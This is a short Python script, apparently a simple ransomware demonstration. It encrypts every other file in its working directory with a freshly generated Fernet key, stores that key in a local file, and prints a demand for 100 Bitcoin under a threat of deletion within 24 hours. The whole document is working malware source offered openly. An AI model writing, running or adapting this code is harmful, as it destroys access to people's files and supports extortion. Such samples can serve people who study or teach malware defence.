#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


# finding files

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

#print(files)


key = Fernet.generate_key()

#print(key)

with open("thekey.key" , "wb") as thekey:
	thekey.write(key)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("All of your files has been encrypted send me 100 Bitcoin or I'll Delete it in 24 hours")
